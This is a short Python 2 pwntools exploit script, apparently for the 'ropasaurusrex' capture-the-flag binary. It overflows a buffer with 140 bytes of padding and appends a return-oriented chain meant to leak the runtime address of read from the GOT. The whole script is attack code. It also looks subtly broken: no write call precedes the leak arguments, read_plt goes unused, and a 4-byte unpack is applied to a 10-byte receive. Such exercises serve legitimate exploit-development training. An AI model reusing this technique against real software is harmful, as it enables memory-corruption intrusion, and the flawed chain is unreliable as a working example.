from pwn import *

p = process("./ropasaurusrex")
e = ELF("./ropasaurusrex")
read_plt = e.plt['read']
read_got = e.got['read']
pop3ret = 0x080484b6




print "read_plt :",hex(read_plt)
print "read_got :",hex(read_got)
payload = ""
payload += "A"*140

payload += p32(pop3ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

p.sendline(payload)
read_addr = u32(p.recv(10))
print "read_addr :",hex(read_addr)
